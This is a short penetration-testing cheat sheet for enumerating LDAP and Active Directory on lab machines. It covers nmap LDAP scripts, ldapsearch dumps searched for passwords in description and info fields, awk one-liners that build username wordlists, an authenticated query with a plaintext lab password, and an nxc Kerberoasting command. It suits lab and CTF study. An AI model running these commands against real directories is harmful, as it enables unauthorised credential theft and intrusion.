
## Enumerating LDAP Domain

```
nmap -n -Pn -sV --script "ldap* and not brute" 192.168.155.122
```

# Apache Directory Studio (Authenticated)

Prefered version, takes more time but is more efficient.

Can be downloaded from **here**: https://directory.apache.org/studio/download/download-linux.html

```
./ApacheDirectoryStudio
```

1. Upon accessing it press on the button on the top-left.
2. Press right click in the "Connections" Tab and choose "New Connection"

Input Support as the connection name, support.htb as the hostname and click Next .

![[Pasted image 20260608225344.png]]

Input the previously retrieved credentials.

![[Pasted image 20260608225420.png]]

We can now view all the objects properly.

![[Pasted image 20260608225627.png]]

And found an "info" panel with an password!
## LDAP User Enumeration

```
ldapsearch -v -x -b "DC=hutch,DC=offsec" -H "ldap://192.168.155.122" "(objectclass=*)"
```

```
ldapsearch -x -H ldap://10.10.161.74 -b "dc=thm,dc=local" > ldapsearch.txt
```

```
cat ldapsearch.txt | grep description
cat ldapsearch.txt | grep info
```

Enumerate users

```
cat ldapsearch.txt | grep dn
```

Save output in wordlist "users.txt"

lkeim format

```
grep -E 'CN=[A-Z][a-z]+ [A-Z][a-z]+' ldapsearch.txt | awk -F',|=' '{print $2}' | awk '{print tolower(substr($1,1,1)) tolower($2)}' | sort -u > users.txt
```

Firstname.Lastname

```
grep -E 'CN=[A-Z][a-z]+ [A-Z][a-z]+' ldapsearch.txt | awk -F',|=' '{print $2}' | awk '{print tolower($1) "." tolower($2)}' | sort -u > users.txt
```

Firstname only

```
grep -E 'CN=[A-Z][a-z]+ [A-Z][a-z]+' ldapsearch.txt | awk -F',|=' '{print $2}' | awk '{print tolower($1)}' | sort -u > users.txt
```

## Authenticated ldapsearch

```
ldapsearch -H "ldap://support.htb" -D ldap@support.htb -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb" "*" > ldapsearch.txt
```
## Kerberoasting using nxc

```
nxc ldap thm.local -u 'guest' -p '' --kerberoasting kerberoastables.txt
```

